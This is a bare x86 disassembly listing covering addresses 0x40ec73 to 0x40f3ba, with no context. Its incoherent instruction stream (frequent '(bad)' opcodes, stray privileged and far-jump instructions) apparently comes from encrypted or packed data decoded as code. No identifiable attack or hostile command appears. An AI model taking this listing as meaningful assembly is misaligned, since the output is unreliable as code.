  40ec73:	xchg   esp,eax
  40ec74:	and    ch,BYTE PTR [ecx-0x52b8e6b8]
  40ec7a:	std    
  40ec7b:	sahf   
  40ec7c:	fcmovnbe st,st(3)
  40ec7e:	xchg   edx,eax
  40ec7f:	icebp  
  40ec80:	clc    
  40ec81:	inc    ecx
  40ec82:	push   ss
  40ec83:	xchg   esp,eax
  40ec84:	cli    
  40ec85:	fcompp 
  40ec87:	int    0xfc
  40ec89:	test   eax,0x4fc99973
  40ec8e:	add    esi,DWORD PTR [ecx+0x72cbb0a5]
  40ec94:	xchg   ecx,eax
  40ec95:	pop    edx
  40ec96:	add    ah,BYTE PTR ss:[ebp-0x13ceeb95]
  40ec9d:	mov    ebp,0xe948e79b
  40eca2:	and    ch,BYTE PTR [edi-0x67eee896]
  40eca8:	xor    ebp,DWORD PTR [edx]
  40ecaa:	iret   
  40ecab:	cdq    
  40ecac:	shr    BYTE PTR [ecx+0x769facf6],1
  40ecb2:	fild   DWORD PTR [ebp-0x80]
  40ecb5:	test   eax,0x60a7c2d3
  40ecba:	sub    BYTE PTR [esi+0x0],bh
  40ecbd:	inc    ecx
  40ecbe:	jne    0x40ed2d
  40ecc0:	mov    al,ds:0x13604ab5
  40ecc5:	je     0x40ed19
  40ecc7:	ror    DWORD PTR [ebx+0x30c42bd3],cl
  40eccd:	loope  0x40ecb9
  40eccf:	cwde   
  40ecd0:	ja     0x40ecb5
  40ecd2:	jp     0x40ec79
  40ecd4:	fs data16 loop 0x40ecad
  40ecd8:	jg     0x40ed55
  40ecda:	xlat   BYTE PTR ds:[ebx]
  40ecdb:	push   ebp
  40ecdc:	sub    eax,0x8de75ea9
  40ece1:	inc    ecx
  40ece2:	push   cs
  40ece3:	stc    
  40ece4:	mov    eax,ds:0xc1447611
  40ece9:	or     ah,BYTE PTR [eax+edi*1-0x524b3e3a]
  40ecf0:	leave  
  40ecf1:	and    bh,BYTE PTR [ecx]
  40ecf3:	clc    
  40ecf4:	mov    ebx,DWORD PTR [ecx-0x1ae30bd2]
  40ecfa:	jl     0x40ed04
  40ecfc:	sbb    DWORD PTR [ecx+0x2031c95a],eax
  40ed02:	loope  0x40ed6c
  40ed04:	loopne 0x40ec91
  40ed06:	sub    BYTE PTR [ecx+edx*1],al
  40ed09:	jns    0x40eca9
  40ed0b:	and    BYTE PTR [ecx+edi*8],dl
  40ed0e:	iret   
  40ed0f:	jle    0x40ed59
  40ed11:	push   cs
  40ed12:	jg     0x40ecc4
  40ed14:	jb     0x40ecd2
  40ed16:	jne    0x40ed01
  40ed18:	and    cl,BYTE PTR ds:0x31a9a05d
  40ed1e:	shl    al,1
  40ed20:	sub    ch,BYTE PTR [ecx+0x7e]
  40ed23:	icebp  
  40ed24:	add    cl,BYTE PTR [edi-0x660ee7c]
  40ed2a:	pop    ss
  40ed2b:	and    BYTE PTR [esp+ebp*1],ch
  40ed2e:	loopne 0x40ecc5
  40ed30:	xlat   BYTE PTR ds:[ebx]
  40ed31:	icebp  
  40ed32:	outs   dx,BYTE PTR ds:[esi]
  40ed33:	push   esi
  40ed34:	xchg   ecx,eax
  40ed35:	jb     0x40ed6d
  40ed37:	sahf   
  40ed38:	jmp    esi
  40ed3a:	mov    dl,0x43
  40ed3d:	pop    ebp
  40ed3e:	pop    ss
  40ed3f:	repz call 0x299cc669
  40ed45:	jle    0x40ed7f
  40ed47:	fcomp  st(1)
  40ed49:	cmc    
  40ed4a:	mov    eax,eax
  40ed4c:	inc    ebx
  40ed4d:	dec    edi
  40ed4e:	or     DWORD PTR [esp+ecx*2],eax
  40ed51:	adc    BYTE PTR ds:0xff191afc,cl
  40ed57:	push   ecx
  40ed58:	test   eax,0x2ce6cfb6
  40ed5d:	call   0xa3ce:0x7265d39e
  40ed64:	aas    
  40ed65:	xchg   ebx,eax
  40ed66:	dec    esi
  40ed67:	xchg   DWORD PTR [eax+eiz*2-0x434e3949],eax
  40ed6e:	cmc    
  40ed6f:	int3   
  40ed70:	mov    DWORD PTR [ebx+0x76],edx
  40ed73:	inc    ebx
  40ed74:	fist   WORD PTR ds:0x5e28e47f
  40ed7a:	push   edi
  40ed7b:	mul    eax
  40ed7d:	sbb    al,0x4c
  40ed7f:	and    al,BYTE PTR [ecx]
  40ed81:	xor    dh,BYTE PTR ds:0x30c2663f
  40ed87:	push   ecx
  40ed88:	pop    esi
  40ed89:	mov    ch,0xee
  40ed8b:	mov    al,ds:0xf5c89728
  40ed90:	bound  ebx,QWORD PTR ds:0x79bf94a4
  40ed96:	sub    bh,ah
  40ed98:	lea    eax,[esi+0x6e]
  40ed9b:	(bad)  
  40ed9c:	idiv   BYTE PTR [ebx]
  40ed9e:	cdq    
  40ed9f:	out    dx,eax
  40eda0:	xchg   BYTE PTR [edi-0x26],bh
  40eda3:	(bad)  
  40eda5:	nop
  40eda6:	stos   DWORD PTR es:[edi],eax
  40eda7:	xor    BYTE PTR [ebx-0x2b0e9640],ah
  40edad:	add    ch,ch
  40edaf:	out    0x11,eax
  40edb1:	std    
  40edb2:	dec    ah
  40edb4:	jbe    0x40ee08
  40edb6:	in     eax,0x89
  40edb8:	push   cs
  40edb9:	lods   al,BYTE PTR ds:[esi]
  40edba:	xor    DWORD PTR [ecx+0x6f],ebp
  40edbd:	and    ebp,ebp
  40edbf:	stos   BYTE PTR es:[edi],al
  40edc0:	xchg   ebp,eax
  40edc1:	dec    ebp
  40edc2:	lods   eax,DWORD PTR ds:[esi]
  40edc3:	mov    ds:0x610221a3,al
  40edc8:	(bad)  
  40edc9:	iret   
  40edca:	mov    cl,0x39
  40edcc:	xchg   ebx,eax
  40edcd:	mov    al,ds:0xbf2a8d1d
  40edd2:	inc    ebx
  40edd3:	mov    al,ds:0x674dac46
  40edd8:	cmp    ch,bh
  40edda:	add    DWORD PTR [esi+0xf],ecx
  40eddd:	(bad)  
  40edde:	jecxz  0x40ee12
  40ede0:	push   ebx
  40ede1:	out    dx,al
  40ede2:	loope  0x40edfe
  40ede4:	mov    bh,0x70
  40ede6:	jb     0x40edd6
  40ede8:	sti    
  40ede9:	call   0xa57:0x39a27491
  40edf0:	cmp    ebp,DWORD PTR [esi-0x5a8f9983]
  40edf6:	repnz int3 
  40edf8:	ficomp DWORD PTR [edx+0x23926763]
  40edfe:	mov    al,BYTE PTR [esi+0x28]
  40ee01:	ror    edi,1
  40ee03:	sbb    al,0x77
  40ee05:	popf   
  40ee06:	push   cs
  40ee07:	xchg   ebp,eax
  40ee08:	inc    edx
  40ee09:	(bad)  [ebp-0x4f9242d5]
  40ee0f:	adc    DWORD PTR [ecx],eax
  40ee11:	pop    ds
  40ee12:	int    0x6f
  40ee14:	jle    0x40ee1b
  40ee16:	sbb    DWORD PTR [ebx],ebp
  40ee18:	mov    gs,WORD PTR [eax]
  40ee1a:	dec    ecx
  40ee1b:	mov    ebp,0x6b7db749
  40ee20:	lock sub eax,0x4065b2d4
  40ee26:	pop    edx
  40ee27:	or     DWORD PTR [edi-0x22],0xffffffdb
  40ee2b:	shl    DWORD PTR [edx],0xef
  40ee2e:	xor    BYTE PTR [esi-0x62c160f5],dh
  40ee34:	(bad)  
  40ee36:	jmp    0x40ee63
  40ee38:	js     0x40eeb8
  40ee3a:	fisub  DWORD PTR [edi-0x80]
  40ee3d:	xchg   edi,eax
  40ee3e:	adc    DWORD PTR [ebp+0x22],esp
  40ee41:	shl    dh,1
  40ee43:	or     eax,0x827ee085
  40ee48:	(bad)  
  40ee49:	lock push 0xffffffe1
  40ee4c:	add    BYTE PTR [si+0x34],ch
  40ee50:	icebp  
  40ee51:	jmp    0xbd8a7b79
  40ee56:	aas    
  40ee57:	inc    DWORD PTR [edi-0xe]
  40ee5a:	cli    
  40ee5b:	inc    edi
  40ee5c:	test   eax,0x1402373b
  40ee61:	mov    dh,0xc6
  40ee63:	ss mov edi,0x61b4b462
  40ee69:	push   ds
  40ee6a:	cmp    bh,0xab
  40ee6d:	cwde   
  40ee6e:	jns    0x40ee51
  40ee70:	int3   
  40ee71:	enter  0xbef8,0xb7
  40ee75:	nop
  40ee76:	inc    eax
  40ee77:	leave  
  40ee78:	clc    
  40ee79:	or     dh,0x97
  40ee7c:	inc    edx
  40ee7d:	lea    ebp,[ebx+0x734f0338]
  40ee83:	loop   0x40eece
  40ee85:	call   0xbe74:0xb91d4b5c
  40ee8c:	mov    ds:0x21f1e493,al
  40ee91:	jae    0x40ee51
  40ee93:	lahf   
  40ee94:	xor    al,0x31
  40ee96:	ret    
  40ee97:	shr    DWORD PTR [esi-0x77faab83],0x79
  40ee9e:	fisub  DWORD PTR [edx]
  40eea0:	adc    ecx,ecx
  40eea2:	mov    eax,ds:0x8ead1d06
  40eea7:	xchg   esi,eax
  40eea8:	pop    esp
  40eea9:	(bad)  
  40eeaa:	push   0x17
  40eeac:	xchg   esp,eax
  40eead:	jg     0x40eede
  40eeaf:	pop    ebp
  40eeb0:	pop    ecx
  40eeb1:	xor    al,BYTE PTR ds:0xb317f81a
  40eeb7:	repz popa 
  40eeb9:	sbb    eax,eax
  40eebb:	fwait
  40eebc:	push   ecx
  40eebd:	repnz pop edx
  40eebf:	inc    edi
  40eec0:	sbb    BYTE PTR [eax],0x27
  40eec3:	sbb    dh,0x21
  40eec6:	lods   eax,DWORD PTR ds:[esi]
  40eec7:	add    dl,ah
  40eec9:	jae    0x40ee76
  40eecb:	jbe    0x40ef1f
  40eecd:	xor    bh,dh
  40eecf:	ds pop edi
  40eed1:	push   cs
  40eed2:	ror    DWORD PTR [esi+0x3b],0xb
  40eed6:	jne    0x40ef0b
  40eed8:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40eeda:	sub    BYTE PTR [esi+esi*1],ch
  40eedd:	into   
  40eede:	fdiv   QWORD PTR [esi+0x314307cd]
  40eee4:	test   DWORD PTR [edx-0x39],edx
  40eee7:	lods   eax,DWORD PTR ds:[esi]
  40eee8:	es pop edi
  40eeea:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40eeec:	sti    
  40eeed:	daa    
  40eeee:	scas   eax,DWORD PTR es:[edi]
  40eeef:	fild   QWORD PTR [ecx+0x3fc020dd]
  40eef5:	sbb    ah,al
  40eef7:	rcl    DWORD PTR [edx-0x462a36c4],cl
  40eefd:	adc    al,0x6b
  40eeff:	and    BYTE PTR [esi],cl
  40ef01:	push   edi
  40ef02:	(bad)  
  40ef03:	pop    eax
  40ef04:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef06:	push   ecx
  40ef07:	dec    ebx
  40ef08:	and    al,0x37
  40ef0a:	mov    ds:0x307236b4,al
  40ef0f:	loopne 0x40ef29
  40ef11:	imul   eax,DWORD PTR [eax+ebx*4+0x4e],0x4b
  40ef16:	and    DWORD PTR [eax-0x23d3b29f],0xe5c03455
  40ef20:	imul   edx,DWORD PTR [ecx+edi*4-0x4b],0xffffffad
  40ef25:	ins    BYTE PTR es:[edi],dx
  40ef26:	mov    dh,BYTE PTR [edx]
  40ef28:	fcom   DWORD PTR [ecx+0x77]
  40ef2b:	or     ebx,DWORD PTR ds:0x5ff33f04
  40ef31:	cwde   
  40ef32:	push   0xbb50be94
  40ef37:	jb     0x40ef3f
  40ef39:	stc    
  40ef3a:	dec    esp
  40ef3b:	xchg   BYTE PTR [ecx+ebx*4],bh
  40ef3e:	mov    dl,0xbc
  40ef40:	pop    ebx
  40ef41:	pop    ebx
  40ef42:	(bad)  
  40ef43:	(bad)  
  40ef45:	jnp    0x40ef73
  40ef47:	adc    al,0x72
  40ef49:	int    0x7
  40ef4b:	mov    ah,0xd
  40ef4d:	or     al,0xd5
  40ef4f:	mov    esi,0x19ae363f
  40ef54:	sbb    al,0x56
  40ef56:	xor    al,0xec
  40ef58:	sti    
  40ef59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef5b:	add    eax,0xdfba983d
  40ef60:	mov    esp,0xd980f3f1
  40ef65:	pop    ebx
  40ef66:	shl    eax,cl
  40ef68:	std    
  40ef69:	test   eax,0x1324753
  40ef6e:	xchg   ebp,edi
  40ef70:	cmp    DWORD PTR [ecx-0x1278e64a],edx
  40ef76:	icebp  
  40ef77:	ins    BYTE PTR es:[edi],dx
  40ef78:	jb     0x40eff7
  40ef7a:	jmp    0x3b7f:0x9c3b5185
  40ef81:	sub    al,0x9e
  40ef83:	pmaxsw mm0,QWORD PTR [ebx]
  40ef86:	jns    0x40ef13
  40ef88:	cmp    BYTE PTR [edx-0x52c848b7],cl
  40ef8e:	repnz or DWORD PTR [ebx+0x4a8a7e10],edx
  40ef95:	(bad)  
  40ef96:	out    dx,eax
  40ef97:	xchg   esp,eax
  40ef98:	lahf   
  40ef99:	cwde   
  40ef9a:	sub    eax,ecx
  40ef9c:	repnz mov bh,0xf7
  40ef9f:	(bad)  [esi-0x6a]
  40efa2:	push   0x2d
  40efa4:	leave  
  40efa5:	rcr    cl,0x2
  40efa8:	test   eax,0x7887eee2
  40efad:	daa    
  40efae:	push   ebp
  40efaf:	jae    0x40ef79
  40efb1:	stos   BYTE PTR es:[edi],al
  40efb2:	ds in  eax,0xbb
  40efb5:	jns    0x40ef78
  40efb7:	pop    es
  40efb8:	mov    edi,0x4e02b42c
  40efbd:	inc    eax
  40efbe:	xchg   ecx,eax
  40efbf:	aam    0x67
  40efc1:	or     esp,eax
  40efc3:	mov    dh,ch
  40efc5:	pop    ebp
  40efc6:	jl     0x40efb1
  40efc8:	mov    ebp,0xae07c814
  40efcd:	addr16 xchg edi,eax
  40efcf:	jb     0x40f035
  40efd1:	xchg   esi,eax
  40efd2:	(bad)  
  40efd3:	pop    eax
  40efd4:	ret    
  40efd5:	sbb    cl,BYTE PTR [esi+0x49012478]
  40efdb:	stos   DWORD PTR es:[edi],eax
  40efdc:	push   cs
  40efdd:	je     0x40efd0
  40efdf:	leave  
  40efe0:	and    BYTE PTR [ebx+0x5],cl
  40efe3:	ds sahf 
  40efe5:	bound  ecx,QWORD PTR [ebx+0x5740f7aa]
  40efeb:	push   cs
  40efec:	inc    eax
  40efed:	mov    dh,0x5f
  40efef:	inc    edx
  40eff0:	or     cl,BYTE PTR [ecx+edx*1]
  40eff3:	ret    
  40eff4:	adc    DWORD PTR [esi],0xfffffffa
  40eff7:	xor    al,0xb7
  40eff9:	sbb    BYTE PTR [edi*2-0x10a0d20d],bl
  40f000:	fst    QWORD PTR [edx]
  40f002:	jnp    0x40eff7
  40f004:	mov    cl,0x8a
  40f006:	sub    ah,BYTE PTR [ebx+0x28]
  40f009:	jmp    0xa348:0xc4e58440
  40f010:	in     eax,dx
  40f011:	sbb    BYTE PTR [esi+0x2e],al
  40f014:	mov    edx,0xdf940356
  40f019:	cmc    
  40f01a:	mov    cl,BYTE PTR [eax-0x7b]
  40f01d:	pop    ds
  40f01e:	sbb    bh,dl
  40f020:	sti    
  40f021:	xchg   edx,eax
  40f022:	dec    ecx
  40f023:	data16 mov al,0xd4
  40f026:	xor    BYTE PTR [ebx+edi*4-0x7b],al
  40f02a:	add    edi,eax
  40f02c:	xchg   ebp,eax
  40f02d:	jo     0x40efba
  40f02f:	mov    ebx,0x11fe0bee
  40f034:	cmp    BYTE PTR [eax+0x52],0x3a
  40f038:	fs daa 
  40f03a:	dec    esi
  40f03b:	or     eax,DWORD PTR [ecx]
  40f03d:	mov    al,ds:0x9fcbb07f
  40f042:	inc    edx
  40f043:	sub    DWORD PTR [esp+esi*1+0x32],0x45
  40f048:	adc    al,0x76
  40f04a:	dec    ebp
  40f04b:	retf   0xcbc3
  40f04e:	xor    eax,0x1a2cf0a8
  40f053:	jb     0x40f03c
  40f055:	enter  0xf1f5,0x8e
  40f059:	cs enter 0x5d89,0x54
  40f05e:	outs   dx,DWORD PTR ds:[esi]
  40f05f:	retf   0xc2ea
  40f062:	pop    ss
  40f063:	pop    ebx
  40f064:	out    0x87,eax
  40f066:	sbb    dl,al
  40f068:	add    ebp,DWORD PTR [edi-0x53]
  40f06b:	pop    es
  40f06c:	mov    dl,0x49
  40f06e:	inc    eax
  40f06f:	scas   eax,DWORD PTR es:[edi]
  40f070:	test   al,0x62
  40f072:	scas   al,BYTE PTR es:[edi]
  40f073:	pop    ebx
  40f074:	jmp    0x8a57:0x28cab4a7
  40f07b:	jns    0x40f040
  40f07d:	pop    ds
  40f07e:	aad    0xf
  40f080:	mov    esp,0x12c413d0
  40f085:	inc    eax
  40f086:	mov    ds:0x197593e9,eax
  40f08b:	sar    DWORD PTR [esi+0x15b0eed7],cl
  40f091:	std    
  40f092:	or     edi,DWORD PTR [ebx-0x61]
  40f095:	cld    
  40f096:	dec    esp
  40f097:	xlat   BYTE PTR ds:[ebx]
  40f098:	jno    0x40f03a
  40f09a:	pushf  
  40f09b:	rol    al,0x25
  40f09e:	enter  0xe83f,0x46
  40f0a2:	adc    DWORD PTR [edx],ebp
  40f0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0a5:	fwait
  40f0a6:	mov    bl,0xea
  40f0a8:	xchg   ebx,eax
  40f0a9:	data16 mov cl,BYTE PTR [ebx-0x1f]
  40f0ad:	adc    al,0x7e
  40f0af:	xchg   esi,eax
  40f0b0:	xor    cl,BYTE PTR [edi-0x7b]
  40f0b3:	pop    esi
  40f0b4:	push   0x5
  40f0b6:	lea    edi,gs:[ecx-0x55]
  40f0ba:	add    BYTE PTR [ecx+0x713a5d6f],dh
  40f0c0:	out    0x2d,eax
  40f0c2:	inc    esp
  40f0c3:	sub    dl,BYTE PTR [ecx+edx*8-0x20]
  40f0c7:	inc    eax
  40f0c8:	jno    0x40f0b0
  40f0ca:	ds sbb al,0xa7
  40f0cd:	adc    ah,BYTE PTR [ecx]
  40f0cf:	pop    ecx
  40f0d0:	ror    edx,cl
  40f0d2:	aas    
  40f0d3:	adc    al,0x4f
  40f0d5:	test   BYTE PTR [esi],cl
  40f0d7:	and    al,BYTE PTR [ecx+0x67]
  40f0da:	arpl   WORD PTR [ebx-0x53],si
  40f0dd:	pop    ebx
  40f0de:	push   esp
  40f0df:	mov    ebp,0x88c8123c
  40f0e4:	or     DWORD PTR [eax+ebx*2-0x30],ecx
  40f0e8:	mov    gs:0xea2aab4b,eax
  40f0ee:	sbb    esi,DWORD PTR [eax+edi*8+0x6235df0c]
  40f0f5:	add    ecx,DWORD PTR [ecx]
  40f0f7:	test   DWORD PTR [ebx],0x5abcaca0
  40f0fd:	arpl   WORD PTR [ebp-0x64835a4d],cx
  40f103:	pop    edx
  40f104:	push   es
  40f105:	cli    
  40f106:	sub    BYTE PTR [edx+0x50c0d9c4],ah
  40f10c:	scas   eax,DWORD PTR es:[edi]
  40f10d:	mov    ebp,0xa89dc4f2
  40f112:	loope  0x40f0f4
  40f114:	test   eax,0xa976d082
  40f119:	inc    esp
  40f11a:	pusha  
  40f11b:	call   0x3ecc12f9
  40f120:	fsubr  DWORD PTR [ecx-0x2b]
  40f123:	dec    edx
  40f124:	fdivp  st(0),st
  40f126:	dec    esp
  40f127:	(bad)  
  40f128:	out    dx,eax
  40f129:	pop    ds
  40f12a:	daa    
  40f12b:	jg     0x40f172
  40f12d:	mov    dl,0x2b
  40f12f:	add    BYTE PTR [edx+0x1677c01a],ch
  40f135:	lock pop ecx
  40f137:	adc    DWORD PTR [edi+0x16],esi
  40f13a:	push   edx
  40f13b:	mov    cl,dl
  40f13d:	enter  0x1e6c,0xa
  40f141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f142:	(bad)  
  40f143:	lds    ebp,FWORD PTR [esi-0x498cf36b]
  40f149:	sub    DWORD PTR [ecx+ecx*4],ecx
  40f14c:	andps  xmm6,XMMWORD PTR [ebx+0x46d01c5]
  40f153:	mov    eax,ds:0xa580a3dd
  40f158:	xchg   esp,eax
  40f159:	fnstsw WORD PTR [edi+0x6a]
  40f15c:	sub    ebp,esi
  40f15e:	xor    DWORD PTR [ecx+0x35],esi
  40f161:	dec    ebp
  40f162:	xor    edx,DWORD PTR [ebx-0x39]
  40f165:	mov    bl,0x33
  40f167:	jb     0x40f1c4
  40f169:	lea    edi,[ebx-0x3d]
  40f16c:	mov    ds:0xf7c6075,eax
  40f171:	mov    ecx,0x92f7a4c7
  40f176:	(bad)  
  40f177:	popa   
  40f178:	call   0xb0b:0x5eaf718d
  40f17f:	push   es
  40f180:	xchg   ebp,eax
  40f181:	rep stos BYTE PTR es:[edi],al
  40f183:	dec    ecx
  40f184:	shl    ebp,cl
  40f186:	mov    ebx,0x9b7978e5
  40f18b:	pop    es
  40f18c:	ret    
  40f18d:	lods   eax,DWORD PTR ds:[esi]
  40f18e:	jo     0x40f20f
  40f190:	mov    bh,0xe0
  40f192:	sbb    bh,BYTE PTR [ecx-0x34]
  40f195:	push   edi
  40f196:	int3   
  40f197:	mov    esi,DWORD PTR [ecx+0x521edc2c]
  40f19d:	adc    BYTE PTR [ecx-0x80],dh
  40f1a0:	mov    ebp,0x51f9f0a
  40f1a5:	sub    DWORD PTR [esi-0x429a15dc],esp
  40f1ab:	gs lock cli 
  40f1ae:	pop    ss
  40f1af:	fs dec eax
  40f1b1:	mov    bh,0x17
  40f1b3:	sbb    DWORD PTR [ebx+0x5d],eax
  40f1b6:	sbb    al,0xbd
  40f1b8:	cs (bad) 
  40f1ba:	idiv   DWORD PTR [edx]
  40f1bc:	rcl    ch,cl
  40f1be:	pcmpeqw mm6,QWORD PTR [eax-0x29]
  40f1c2:	sti    
  40f1c3:	ja     0x40f14e
  40f1c5:	pop    esp
  40f1c6:	jne    0x40f1b6
  40f1c8:	enter  0x445,0xbe
  40f1cc:	push   eax
  40f1cd:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40f1cf:	mov    dl,0xd8
  40f1d1:	clc    
  40f1d2:	dec    edx
  40f1d3:	inc    edx
  40f1d4:	sub    al,0x3c
  40f1d6:	push   eax
  40f1d7:	mov    bl,0xfb
  40f1d9:	push   ds
  40f1da:	cmc    
  40f1db:	or     al,0xb3
  40f1dd:	stos   DWORD PTR es:[edi],eax
  40f1de:	pop    ebx
  40f1df:	mov    edi,0xf78ebbc2
  40f1e4:	sub    BYTE PTR ds:[esi],bh
  40f1e7:	sbb    bl,BYTE PTR [eax-0x12]
  40f1ea:	lahf   
  40f1eb:	pop    edx
  40f1ec:	pop    ds
  40f1ed:	cmp    ecx,edx
  40f1ef:	(bad)  
  40f1f0:	sub    DWORD PTR [ecx],eax
  40f1f2:	call   0x91d01e99
  40f1f7:	fnstcw WORD PTR [esi]
  40f1f9:	jno    0x40f180
  40f1fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1fc:	ja     0x40f254
  40f1fe:	xor    bl,dh
  40f200:	call   0xa1b:0xcbc0b7b3
  40f207:	lods   al,BYTE PTR ds:[esi]
  40f208:	leavew 
  40f20a:	mov    bl,0x5b
  40f20c:	fnstsw WORD PTR [ecx+0x33]
  40f20f:	or     esp,DWORD PTR [esi-0x68]
  40f212:	pop    DWORD PTR [esi-0x1ea52c40]
  40f218:	out    dx,al
  40f219:	sub    ah,BYTE PTR cs:[ebx]
  40f21c:	pop    esp
  40f21d:	aaa    
  40f21e:	sub    BYTE PTR [eax-0x43513d97],0xb0
  40f225:	mov    bl,0x2c
  40f227:	iret   
  40f228:	ins    DWORD PTR es:[edi],dx
  40f229:	and    BYTE PTR [ebp-0xbc917f5],cl
  40f22f:	inc    esp
  40f230:	popf   
  40f231:	aaa    
  40f232:	jecxz  0x40f1f2
  40f234:	(bad)  
  40f235:	dec    esp
  40f236:	push   esi
  40f237:	aad    0x92
  40f239:	pop    ss
  40f23a:	sbb    dl,BYTE PTR [ecx-0x1b]
  40f23d:	xchg   esi,eax
  40f23e:	ret    
  40f23f:	pop    es
  40f240:	ret    0x66b9
  40f243:	(bad)  
  40f244:	mov    esi,0xe77cdebd
  40f249:	xchg   esp,eax
  40f24a:	push   0x9
  40f24c:	pop    edx
  40f24d:	in     eax,0xfa
  40f24f:	mov    BYTE PTR [edi+0x60],dh
  40f252:	xor    esp,DWORD PTR [eax+0x75ff910d]
  40f258:	out    0x42,al
  40f25a:	cmp    esp,ecx
  40f25c:	ins    DWORD PTR es:[edi],dx
  40f25d:	and    BYTE PTR [edx+0x69093dde],dl
  40f263:	or     esi,edx
  40f265:	imul   eax,DWORD PTR [esi],0x9f3f73a8
  40f26b:	pop    ebx
  40f26c:	mov    eax,0xbbb78c76
  40f271:	addr16 push ds
  40f273:	xchg   BYTE PTR [ebx+0x3afc7a69],al
  40f279:	stc    
  40f27a:	out    dx,al
  40f27b:	push   edx
  40f27c:	sub    al,0xa0
  40f27e:	shl    DWORD PTR [edx],0x5e
  40f281:	outs   dx,BYTE PTR ds:[esi]
  40f282:	xchg   edx,eax
  40f283:	xchg   esi,eax
  40f284:	(bad)  
  40f286:	fs daa 
  40f288:	mov    eax,0x411bab6e
  40f28d:	and    BYTE PTR [edx-0x46b6bf7b],bl
  40f293:	xchg   edx,eax
  40f294:	scas   al,BYTE PTR es:[edi]
  40f295:	es jmp 0x5969:0xcbc3b783
  40f29d:	lds    edx,FWORD PTR [esi-0x3]
  40f2a0:	cmp    eax,esp
  40f2a2:	xchg   DWORD PTR [ecx+0x6c],edi
  40f2a5:	int3   
  40f2a6:	test   al,0x9c
  40f2a8:	popa   
  40f2a9:	pop    ss
  40f2aa:	inc    ebx
  40f2ab:	add    al,0x30
  40f2ad:	into   
  40f2ae:	cdq    
  40f2af:	xchg   BYTE PTR [eax+0x65],bl
  40f2b2:	xor    eax,DWORD PTR [ebp-0x54]
  40f2b5:	cmp    DWORD PTR [esi+edi*8],ecx
  40f2b8:	shr    BYTE PTR ds:0x29917d58,cl
  40f2be:	jmp    0xa4b0:0x1568fda6
  40f2c5:	ins    DWORD PTR es:[edi],dx
  40f2c6:	test   eax,0x61b2af3
  40f2cb:	and    cl,BYTE PTR [edi-0x75964d6b]
  40f2d1:	aam    0x39
  40f2d3:	and    al,0x47
  40f2d5:	test   BYTE PTR [eax-0x60],cl
  40f2d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2d9:	arpl   WORD PTR [eax+0x3463f582],dx
  40f2df:	xchg   ebx,eax
  40f2e0:	lea    eax,gs:[edx-0x72]
  40f2e4:	add    al,0x7a
  40f2e6:	sub    DWORD PTR [esi],ebx
  40f2e8:	stos   DWORD PTR es:[edi],eax
  40f2e9:	xor    ch,BYTE PTR [edx-0x3231d54a]
  40f2ef:	je     0x40f2c9
  40f2f1:	xchg   ecx,eax
  40f2f2:	(bad)  
  40f2f3:	mov    cl,0x7f
  40f2f5:	jb     0x40f2e6
  40f2f7:	ins    BYTE PTR es:[edi],dx
  40f2f8:	rcl    dl,0x62
  40f2fb:	jb     0x40f2d5
  40f2fd:	jl     0x40f37c
  40f2ff:	std    
  40f300:	mov    bh,0x13
  40f302:	mov    al,ds:0x1cbb73ad
  40f307:	test   BYTE PTR [edi],dh
  40f309:	loop   0x40f2a1
  40f30b:	jge    0x40f356
  40f30d:	lock sbb eax,0x449dfd1b
  40f313:	mov    ds:0x3bf48528,al
  40f318:	jne    0x40f351
  40f31a:	lods   eax,DWORD PTR ds:[esi]
  40f31b:	cdq    
  40f31c:	repnz push cs
  40f31e:	xor    eax,0xf7b1a716
  40f323:	mov    bh,0xbd
  40f325:	fwait
  40f326:	inc    eax
  40f327:	enter  0x90bb,0x56
  40f32b:	shr    BYTE PTR es:[esi-0x38a72079],cl
  40f332:	push   ecx
  40f333:	xchg   ebp,eax
  40f334:	mov    ds:0x716c5632,eax
  40f339:	jb     0x40f37e
  40f33b:	mov    edi,DWORD PTR [edx-0x37d42342]
  40f341:	sbb    al,BYTE PTR [edi-0x201122c0]
  40f347:	call   ebx
  40f349:	mov    cl,0x8b
  40f34b:	pop    ss
  40f34c:	arpl   WORD PTR [ecx],si
  40f34e:	pop    es
  40f34f:	mov    dh,0xc2
  40f351:	jb     0x40f390
  40f353:	fidivr DWORD PTR [ebp-0xb]
  40f356:	xchg   edx,eax
  40f357:	dec    ebp
  40f358:	into   
  40f359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f35a:	aas    
  40f35b:	int3   
  40f35c:	aas    
  40f35d:	lds    edx,FWORD PTR ds:0x58c38c2c
  40f363:	xchg   DWORD PTR [ebp+0x7e],edx
  40f366:	mov    cl,0xee
  40f368:	mov    al,ds:0x1890198e
  40f36d:	fs jno 0x40f33b
  40f370:	add    al,0x7b
  40f372:	add    DWORD PTR [esi+0x65],esi
  40f375:	jmp    0x40f3d7
  40f377:	cdq    
  40f378:	add    ecx,DWORD PTR [ebp+0x4bd2859d]
  40f37e:	push   eax
  40f37f:	sbb    BYTE PTR [ecx+0x5e9bbbdd],ah
  40f385:	jmp    0xb64b4e62
  40f38a:	xchg   edx,eax
  40f38b:	sar    edx,0x34
  40f38e:	sub    BYTE PTR [ebp+0xaab17c0],al
  40f394:	fbstp  TBYTE PTR [esi-0x56]
  40f397:	lea    ecx,[ebp-0x58]
  40f39a:	and    BYTE PTR [edi+0x7d],0xa8
  40f39e:	mov    BYTE PTR [esi+edi*1+0x62],al
  40f3a2:	pop    ebp
  40f3a3:	cdq    
  40f3a4:	fstp   DWORD PTR [edx]
  40f3a6:	mov    eax,0x3cdc5eca
  40f3ab:	pop    ebx
  40f3ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3ad:	icebp  
  40f3ae:	ds jb  0x40f36c
  40f3b1:	sub    al,0x86
  40f3b3:	ins    DWORD PTR es:[edi],dx
  40f3b4:	fisubr DWORD PTR [edx+0x223fc709]
  40f3ba:	mov    DWORD PTR [esp+ebx*1],esp
